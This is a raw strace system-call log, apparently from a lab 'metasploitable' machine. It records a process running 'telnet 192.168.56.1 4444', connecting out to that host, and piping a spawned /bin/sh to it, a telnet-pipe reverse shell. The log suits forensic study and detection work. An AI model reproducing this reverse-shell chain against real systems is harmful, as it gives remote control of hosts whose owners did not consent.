+[pid  6366] 22:01:44.795893 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
+[pid  6366] 22:01:44.795910 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
+[pid  6366] 22:01:44.795938 uname({sys="Linux", node="metasploitable", ...}) = 0
+[pid  6366] 22:01:44.796103 brk(0)      = 0x804f000
+[pid  6366] 22:01:44.796114 brk(0x8070000) = 0x8070000
+[pid  6366] 22:01:44.796154 clock_gettime(CLOCK_MONOTONIC, {23909, 268647728}) = 0
+[pid  6366] 22:01:44.796169 nanosleep({3962, 0},  <unfinished ...>
+[pid  6365] 22:01:44.811408 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE CHLD],  <unfinished ...>
+[pid  6363] 22:01:44.811446 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE],  <unfinished ...>
+[pid  6364] 22:01:44.811468 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE],  <unfinished ...>
+[pid  6362] 22:01:44.811500 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE],  <unfinished ...>
+[pid  6364] 22:01:44.811520 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6363] 22:01:44.811527 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6363] 22:01:44.811552 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  6365] 22:01:44.811562 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6365] 22:01:44.811583 close(4 <unfinished ...>
+[pid  6364] 22:01:44.811595 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  6362] 22:01:44.811605 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6362] 22:01:44.811614 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {0x807e540, [], 0}, 8) = 0
+[pid  6362] 22:01:44.811643 close(4 <unfinished ...>
+[pid  6364] 22:01:44.811650 <... rt_sigprocmask resumed> [FPE USR2 PIPE], 8) = 0
+[pid  6364] 22:01:44.811678 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE],  <unfinished ...>
+[pid  6363] 22:01:44.811698 <... rt_sigprocmask resumed> [FPE USR2 PIPE], 8) = 0
+[pid  6365] 22:01:44.811708 <... close resumed> ) = 0
+[pid  6362] 22:01:44.811714 <... close resumed> ) = 0
+[pid  6363] 22:01:44.811722 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE],  <unfinished ...>
+[pid  6365] 22:01:44.811747 close(4 <unfinished ...>
+[pid  6362] 22:01:44.811756 read(3,  <unfinished ...>
+[pid  6363] 22:01:44.811763 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6363] 22:01:44.811770 rt_sigprocmask(SIG_BLOCK, [CHLD], [FPE USR2 PIPE], 8) = 0
+[pid  6363] 22:01:44.811787 rt_sigaction(SIGINT, {0x807f150, [], 0}, {0x8091fd0, [], 0}, 8) = 0
+[pid  6363] 22:01:44.811815 waitpid(-1, Process 6363 suspended
+ <unfinished ...>
+[pid  6364] 22:01:44.811824 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6364] 22:01:44.811830 rt_sigprocmask(SIG_BLOCK, [CHLD], [FPE USR2 PIPE], 8) = 0
+[pid  6364] 22:01:44.811848 rt_sigaction(SIGINT, {0x807f150, [], 0},  <unfinished ...>
+[pid  6365] 22:01:44.811860 <... close resumed> ) = -1 EBADF (Bad file descriptor)
+[pid  6365] 22:01:44.811871 pipe( <unfinished ...>
+[pid  6364] 22:01:44.811878 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6364] 22:01:44.811896 waitpid(-1, Process 6364 suspended
+ <unfinished ...>
+[pid  6365] 22:01:44.811906 <... pipe resumed> [4, 5]) = 0
+[pid  6365] 22:01:44.811934 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [FPE USR2 PIPE CHLD], 8) = 0
+[pid  6365] 22:01:44.811953 clone(Process 6367 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e276f8) = 6367
+[pid  6367] 22:01:44.812033 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE], NULL, 8) = 0
+[pid  6367] 22:01:44.812052 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6367] 22:01:44.812072 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6367] 22:01:44.812091 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6367] 22:01:44.812121 close(4)    = 0
+[pid  6367] 22:01:44.812164 dup2(3, 0)  = 0
+[pid  6367] 22:01:44.812175 close(3)    = 0
+[pid  6367] 22:01:44.812184 dup2(5, 1)  = 1
+[pid  6367] 22:01:44.812194 close(5)    = 0
+[pid  6367] 22:01:44.812304 stat64(".", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+[pid  6367] 22:01:44.812343 stat64("/sbin/telnet", 0xbf962d88) = -1 ENOENT (No such file or directory)
+[pid  6367] 22:01:44.812365 stat64("/bin/telnet", 0xbf962d88) = -1 ENOENT (No such file or directory)
+[pid  6367] 22:01:44.812382 stat64("/usr/sbin/telnet", 0xbf962d88) = -1 ENOENT (No such file or directory)
+[pid  4409] 22:01:44.823973 close(5 <unfinished ...>
+[pid  6361] 22:01:44.824299 waitpid(6362, Process 6361 suspended
+ <unfinished ...>
+[pid  6365] 22:01:44.824422 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE CHLD],  <unfinished ...>
+[pid  6367] 22:01:44.824819 stat64("/usr/bin/telnet", {st_mode=S_IFREG|0755, st_size=77504, ...}) = 0
+[pid  6367] 22:01:44.824962 stat64("/usr/bin/telnet", {st_mode=S_IFREG|0755, st_size=77504, ...}) = 0
+[pid  6367] 22:01:44.825033 rt_sigaction(SIGINT, {SIG_DFL}, {0x8091fd0, [], 0}, 8) = 0
+[pid  6367] 22:01:44.825055 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6367] 22:01:44.825075 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+[pid  6367] 22:01:44.825095 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+[pid  6367] 22:01:44.825114 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+[pid  6367] 22:01:44.825143 execve("/usr/bin/telnet", ["telnet", "192.168.56.1", "4444"], [/* 15 vars */]) = 0
+[pid  6367] 22:01:44.825270 brk(0)      = 0x805d000
+[pid  6367] 22:01:44.825299 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6367] 22:01:44.825320 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ee6000
+[pid  6367] 22:01:44.825340 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+[pid  6367] 22:01:44.825363 open("/etc/ld.so.cache", O_RDONLY) = 3
+[pid  6367] 22:01:44.825379 fstat64(3, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  6367] 22:01:44.825412 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7ede000
+[pid  6367] 22:01:44.825423 close(3)    = 0
+[pid  6367] 22:01:44.825437 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6367] 22:01:44.825460 open("/lib/libncurses.so.5", O_RDONLY) = 3
+[pid  6367] 22:01:44.825478 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220"..., 512) = 512
+[pid  6367] 22:01:44.825502 fstat64(3, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
+[pid  6367] 22:01:44.825534 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7eae000
+[pid  6367] 22:01:44.825548 mmap2(0xb7edb000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2c) = 0xb7edb000
+[pid  6367] 22:01:44.825569 close(3)    = 0
+[pid  6367] 22:01:44.825582 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6367] 22:01:44.825602 open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
+[pid  6367] 22:01:44.825620 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0`*\4\000"..., 512) = 512
+[pid  6367] 22:01:44.825642 fstat64(3, {st_mode=S_IFREG|0644, st_size=970680, ...}) = 0
+[pid  6367] 22:01:44.825676 mmap2(NULL, 993036, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7dbb000
+[pid  6367] 22:01:44.825688 mmap2(0xb7ea3000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xe8) = 0xb7ea3000
+[pid  6367] 22:01:44.825705 mmap2(0xb7ea8000, 22284, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ea8000
+[pid  6367] 22:01:44.825722 close(3)    = 0
+[pid  6367] 22:01:44.825736 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6367] 22:01:44.825753 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 3
+[pid  6367] 22:01:44.825774 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\000"..., 512) = 512
+[pid  6367] 22:01:44.825795 fstat64(3, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
+[pid  6367] 22:01:44.825828 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dba000
+[pid  6367] 22:01:44.825842 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7d95000
+[pid  6367] 22:01:44.825853 mmap2(0xb7db8000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x23) = 0xb7db8000
+[pid  6367] 22:01:44.825873 close(3)    = 0
+[pid  6367] 22:01:44.825887 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6367] 22:01:44.825907 open("/lib/libgcc_s.so.1", O_RDONLY) = 3
+[pid  6367] 22:01:44.825922 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\31\0\000"..., 512) = 512
+[pid  6367] 22:01:44.825944 fstat64(3, {st_mode=S_IFREG|0644, st_size=42700, ...}) = 0
+[pid  6367] 22:01:44.825977 mmap2(NULL, 41700, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7d8a000
+[pid  6367] 22:01:44.825988 mmap2(0xb7d94000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xa) = 0xb7d94000
+[pid  6367] 22:01:44.826004 close(3)    = 0
+[pid  6367] 22:01:44.826018 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6367] 22:01:44.826035 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 3
+[pid  6367] 22:01:44.826054 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1"..., 512) = 512
+[pid  6367] 22:01:44.826075 fstat64(3, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+[pid  6367] 22:01:44.826108 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7c3b000
+[pid  6367] 22:01:44.826120 mmap2(0xb7d84000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x149) = 0xb7d84000
+[pid  6367] 22:01:44.826137 mmap2(0xb7d87000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d87000
+[pid  6367] 22:01:44.826153 close(3)    = 0
+[pid  6367] 22:01:44.826169 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6367] 22:01:44.826186 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 3
+[pid  6367] 22:01:44.826205 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\000"..., 512) = 512
+[pid  6367] 22:01:44.826227 fstat64(3, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
+[pid  6367] 22:01:44.826259 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7c37000
+[pid  6367] 22:01:44.826271 mmap2(0xb7c39000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1) = 0xb7c39000
+[pid  6367] 22:01:44.826290 close(3)    = 0
+[pid  6367] 22:01:44.826320 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7c36000
+[pid  6367] 22:01:44.826337 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7c36940, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+[pid  6367] 22:01:44.826427 mprotect(0xb7d84000, 4096, PROT_READ) = 0
+[pid  6367] 22:01:44.826696 mprotect(0xb7ea3000, 12288, PROT_READ) = 0
+[pid  6367] 22:01:44.826736 munmap(0xb7ede000, 29338) = 0
+[pid  6367] 22:01:44.826842 brk(0)      = 0x805d000
+[pid  6367] 22:01:44.826853 brk(0x8082000) = 0x8082000
+[pid  6367] 22:01:44.826894 rt_sigaction(SIGTSTP, {0x8053270, [TSTP], SA_RESTART}, {SIG_DFL}, 8) = 0
+[pid  6367] 22:01:44.826920 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8f0dc8) = -1 EINVAL (Invalid argument)
+[pid  6367] 22:01:44.826942 rt_sigprocmask(SIG_BLOCK, NULL, [FPE USR2 PIPE], 8) = 0
+[pid  6367] 22:01:44.826973 socket(PF_NETLINK, SOCK_RAW, 0) = 3
+[pid  6367] 22:01:44.826993 bind(3, {sa_family=AF_NETLINK, pid=0, groups=00000000}, 12) = 0
+[pid  6367] 22:01:44.827012 getsockname(3, {sa_family=AF_NETLINK, pid=6367, groups=00000000}, [12]) = 0
+[pid  6367] 22:01:44.827055 time(NULL)  = 1478487704
+[pid  6367] 22:01:44.827073 sendto(3, "\24\0\0\0\26\0\1\3\230\356\37X\0\0\0\0\0\0\0\0", 20, 0, {sa_family=AF_NETLINK, pid=0, groups=00000000}, 12) = 20
+[pid  6367] 22:01:44.827104 recvmsg(3, {msg_name(12)={sa_family=AF_NETLINK, pid=0, groups=00000000}, msg_iov(1)=[{"0\0\0\0\24\0\2\0\230\356\37X\337\30\0\0\2\10\200\376\1"..., 4096}], msg_controllen=0, msg_flags=0}, 0) = 108
+[pid  6367] 22:01:44.827145 recvmsg(3, {msg_name(12)={sa_family=AF_NETLINK, pid=0, groups=00000000}, msg_iov(1)=[{"@\0\0\0\24\0\2\0\230\356\37X\337\30\0\0\n\200\200\376\1"..., 4096}], msg_controllen=0, msg_flags=0}, 0) = 128
+[pid  6367] 22:01:44.827183 recvmsg(3, {msg_name(12)={sa_family=AF_NETLINK, pid=0, groups=00000000}, msg_iov(1)=[{"\24\0\0\0\3\0\2\0\230\356\37X\337\30\0\0\0\0\0\0\1\0\0"..., 4096}], msg_controllen=0, msg_flags=0}, 0) = 20
+[pid  6367] 22:01:44.827215 close(3)    = 0
+[pid  6367] 22:01:44.827262 fstat64(1,  <unfinished ...>
+[pid  4409] 22:01:44.864587 <... close resumed> ) = 0
+[pid  6365] 22:01:44.865055 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6367] 22:01:44.865830 <... fstat64 resumed> {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+[pid  4409] 22:01:44.865911 select(24, [21 22 23], NULL, NULL, NULL <unfinished ...>
+[pid  6365] 22:01:44.865950 close(3 <unfinished ...>
+[pid  6367] 22:01:44.866013 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
+[pid  6365] 22:01:44.866027 <... close resumed> ) = 0
+[pid  6367] 22:01:44.866046 <... mmap2 resumed> ) = 0xb7ee5000
+[pid  6365] 22:01:44.866053 close(5 <unfinished ...>
+[pid  6367] 22:01:44.866073 close(-1 <unfinished ...>
+[pid  6365] 22:01:44.866078 <... close resumed> ) = 0
+[pid  6367] 22:01:44.866096 <... close resumed> ) = -1 EBADF (Bad file descriptor)
+[pid  6365] 22:01:44.866102 close(3 <unfinished ...>
+[pid  6367] 22:01:44.866116 socket(PF_INET, SOCK_STREAM, IPPROTO_IP <unfinished ...>
+[pid  6365] 22:01:44.866122 <... close resumed> ) = -1 EBADF (Bad file descriptor)
+[pid  6367] 22:01:44.866135 <... socket resumed> ) = 3
+[pid  6365] 22:01:44.866140 close(5 <unfinished ...>
+[pid  6367] 22:01:44.866154 setsockopt(3, SOL_IP, IP_TOS, [16], 4 <unfinished ...>
+[pid  6365] 22:01:44.866162 <... close resumed> ) = -1 EBADF (Bad file descriptor)
+[pid  6367] 22:01:44.866173 <... setsockopt resumed> ) = 0
+[pid  6365] 22:01:44.866178 pipe( <unfinished ...>
+[pid  6367] 22:01:44.866192 connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("192.168.56.1")}, 16 <unfinished ...>
+[pid  6365] 22:01:44.866205 <... pipe resumed> [3, 5]) = 0
+[pid  6367] 22:01:44.866356 <... connect resumed> ) = 0
+[pid  6365] 22:01:44.866364 rt_sigprocmask(SIG_BLOCK, [INT CHLD],  <unfinished ...>
+[pid  6367] 22:01:44.866388 open("/etc/telnetrc", O_RDONLY <unfinished ...>
+[pid  6365] 22:01:44.866400 <... rt_sigprocmask resumed> [FPE USR2 PIPE CHLD], 8) = 0
+[pid  6367] 22:01:44.866418 <... open resumed> ) = -1 ENOENT (No such file or directory)
+[pid  6365] 22:01:44.866425 clone( <unfinished ...>
+[pid  6367] 22:01:44.866481 open("(null)/.telnetrc", O_RDONLYProcess 6368 attached
+ <unfinished ...>
+[pid  6365] 22:01:44.866494 <... clone resumed> child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e276f8) = 6368
+[pid  6367] 22:01:44.866532 <... open resumed> ) = -1 ENOENT (No such file or directory)
+[pid  6368] 22:01:44.866538 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE],  <unfinished ...>
+[pid  6367] 22:01:44.866557 write(1, "Trying 192.168.56.1...\nConnected"..., 76 <unfinished ...>
+[pid  6368] 22:01:44.866571 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6367] 22:01:44.866585 <... write resumed> ) = 76
+[pid  6368] 22:01:44.866590 rt_sigaction(SIGTSTP, {SIG_DFL},  <unfinished ...>
+[pid  6367] 22:01:44.866604 rt_sigprocmask(SIG_BLOCK, NULL,  <unfinished ...>
+[pid  6368] 22:01:44.866609 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6367] 22:01:44.866621 <... rt_sigprocmask resumed> [FPE USR2 PIPE], 8) = 0
+[pid  6368] 22:01:44.866629 rt_sigaction(SIGTTIN, {SIG_DFL},  <unfinished ...>
+[pid  6367] 22:01:44.866643 rt_sigaction(SIGINT, {0x804f550, [INT], SA_RESTART},  <unfinished ...>
+[pid  6368] 22:01:44.866655 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6367] 22:01:44.866667 <... rt_sigaction resumed> {SIG_IGN}, 8) = 0
+[pid  6368] 22:01:44.866676 rt_sigaction(SIGTTOU, {SIG_DFL},  <unfinished ...>
+[pid  6367] 22:01:44.866689 rt_sigaction(SIGQUIT, {0x804f500, [QUIT], SA_RESTART},  <unfinished ...>
+[pid  6368] 22:01:44.866700 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6367] 22:01:44.866732 <... rt_sigaction resumed> {SIG_IGN}, 8) = 0
+[pid  6368] 22:01:44.866752 rt_sigaction(SIGINT, {SIG_DFL},  <unfinished ...>
+[pid  6367] 22:01:44.866780 rt_sigaction(SIGWINCH, {0x804f4e0, [WINCH], SA_RESTART},  <unfinished ...>
+[pid  6368] 22:01:44.866800 <... rt_sigaction resumed> {0x8091fd0, [], 0}, 8) = 0
+[pid  6367] 22:01:44.866816 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6368] 22:01:44.866826 rt_sigaction(SIGQUIT, {SIG_DFL},  <unfinished ...>
+[pid  6367] 22:01:44.866840 rt_sigaction(SIGTSTP, {0x8053270, [TSTP], SA_RESTART},  <unfinished ...>
+[pid  6368] 22:01:44.866851 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6367] 22:01:44.866863 <... rt_sigaction resumed> {0x8053270, [TSTP], SA_RESTART}, 8) = 0
+[pid  6368] 22:01:44.866873 rt_sigaction(SIGCHLD, {SIG_DFL},  <unfinished ...>
+[pid  6367] 22:01:44.866887 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
+[pid  6368] 22:01:44.866894 <... rt_sigaction resumed> {0x807e540, [], 0}, 8) = 0
+[pid  6367] 22:01:44.866909 <... ioctl resumed> , 0xbf8f0854) = -1 EINVAL (Invalid argument)
+[pid  6368] 22:01:44.866915 rt_sigaction(SIGINT, {SIG_IGN},  <unfinished ...>
+[pid  6367] 22:01:44.866928 ioctl(0, SNDCTL_TMR_STOP or TCSETSW <unfinished ...>
+[pid  6368] 22:01:44.866934 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6367] 22:01:44.866945 <... ioctl resumed> , {B0 opost isig icanon echo ...}) = -1 EINVAL (Invalid argument)
+[pid  6368] 22:01:44.866962 rt_sigaction(SIGQUIT, {SIG_IGN},  <unfinished ...>
+[pid  6367] 22:01:44.866974 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
+[pid  6368] 22:01:44.866980 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6367] 22:01:44.866992 <... ioctl resumed> , 0xbf8f0854) = -1 EINVAL (Invalid argument)
+[pid  6368] 22:01:44.866998 rt_sigaction(SIGCHLD, {0x807e540, [], 0},  <unfinished ...>
+[pid  6367] 22:01:44.867011 ioctl(0, SNDCTL_TMR_START or TCSETS <unfinished ...>
+[pid  6368] 22:01:44.867017 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6367] 22:01:44.867030 <... ioctl resumed> , {B0 opost isig icanon echo ...}) = -1 EINVAL (Invalid argument)
+[pid  6368] 22:01:44.867044 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  6367] 22:01:44.867056 ioctl(0, FIONBIO <unfinished ...>
+[pid  6368] 22:01:44.867064 <... rt_sigprocmask resumed> [FPE USR2 PIPE], 8) = 0
+[pid  6367] 22:01:44.867074 <... ioctl resumed> , [1]) = 0
+[pid  6368] 22:01:44.867080 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE],  <unfinished ...>
+[pid  6367] 22:01:44.867091 ioctl(1, FIONBIO <unfinished ...>
+[pid  6368] 22:01:44.867097 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6367] 22:01:44.867112 <... ioctl resumed> , [1]) = 0
+[pid  6368] 22:01:44.867119 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  6367] 22:01:44.867130 ioctl(3, FIONBIO <unfinished ...>
+[pid  6368] 22:01:44.867135 <... rt_sigprocmask resumed> [FPE USR2 PIPE], 8) = 0
+[pid  6367] 22:01:44.867145 <... ioctl resumed> , [1]) = 0
+[pid  6368] 22:01:44.867152 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE],  <unfinished ...>
+[pid  6367] 22:01:44.867167 setsockopt(3, SOL_SOCKET, SO_OOBINLINE, [1], 4 <unfinished ...>
+[pid  6368] 22:01:44.867175 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6367] 22:01:44.867185 <... setsockopt resumed> ) = 0
+[pid  6368] 22:01:44.867190 close(3 <unfinished ...>
+[pid  6367] 22:01:44.867200 select(4, [0 3], [], [3], {0, 0} <unfinished ...>
+[pid  6368] 22:01:44.867212 <... close resumed> ) = 0
+[pid  6367] 22:01:44.867254 <... select resumed> ) = 0 (Timeout)
+[pid  6368] 22:01:44.867259 dup2(4, 0 <unfinished ...>
+[pid  6367] 22:01:44.867268 select(4, [0 3], [], [3], NULL <unfinished ...>
+[pid  6368] 22:01:44.867278 <... dup2 resumed> ) = 0
+[pid  6368] 22:01:44.867285 close(4)    = 0
+[pid  6368] 22:01:44.867295 dup2(5, 1)  = 1
+[pid  6368] 22:01:44.867305 close(5)    = 0
+[pid  6368] 22:01:44.867320 dup2(1, 2)  = 2
+[pid  6368] 22:01:44.867337 fcntl64(1, F_GETFD) = 0
+[pid  6368] 22:01:44.867417 stat64(".", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+[pid  6368] 22:01:44.867455 stat64("/sbin/sh", 0xbf962998) = -1 ENOENT (No such file or directory)
+[pid  6368] 22:01:44.867471 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+[pid  6368] 22:01:44.867507 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+[pid  6368] 22:01:44.867546 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [FPE USR2 PIPE], 8) = 0
+[pid  6368] 22:01:44.867564 clone(Process 6369 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e276f8) = 6369
+[pid  6365] 22:01:44.900984 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE CHLD],  <unfinished ...>
+[pid  6369] 22:01:44.901059 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE], NULL, 8) = 0
+[pid  6369] 22:01:44.901083 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6369] 22:01:44.901104 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6369] 22:01:44.901123 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6369] 22:01:44.901149 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  6369] 22:01:44.901174 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  6369] 22:01:44.901194 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+[pid  6369] 22:01:44.901262 execve("/bin/sh", ["sh"], [/* 15 vars */]) = 0
+[pid  6369] 22:01:44.901381 brk(0)      = 0x80f9000
+[pid  6369] 22:01:44.901412 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:44.901433 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f21000
+[pid  6369] 22:01:44.901453 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:44.901477 open("/etc/ld.so.cache", O_RDONLY) = 3
+[pid  6369] 22:01:44.901495 fstat64(3, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  6369] 22:01:44.901528 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7f19000
+[pid  6369] 22:01:44.901539 close(3)    = 0
+[pid  6369] 22:01:44.901553 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:44.901576 open("/lib/libncurses.so.5", O_RDONLY) = 3
+[pid  6369] 22:01:44.901594 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220"..., 512) = 512
+[pid  6369] 22:01:44.901618 fstat64(3, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
+[pid  6369] 22:01:44.901651 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7ee9000
+[pid  6369] 22:01:44.901665 mmap2(0xb7f16000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2c) = 0xb7f16000
+[pid  6369] 22:01:44.901685 close(3)    = 0
+[pid  6369] 22:01:44.901699 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
